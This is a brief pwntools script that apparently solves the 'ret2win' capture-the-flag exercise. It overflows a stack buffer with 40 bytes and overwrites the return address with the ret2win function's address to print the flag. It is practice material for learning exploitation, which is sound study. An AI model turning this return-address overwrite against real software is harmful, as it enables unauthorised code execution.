from pwn import *

BINARY = "./ret2win"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "amd64"
context.binary = BINARY

p = process(BINARY)

rop = b"A"*40
rop += p64(ELF.symbols["ret2win"])
log.success(f"ROP chain : {rop}")

p.recv()
p.sendline(rop)

flag = p.recvall().split(b'\n')#[-2]
log.success(f"FLAG : {flag}")
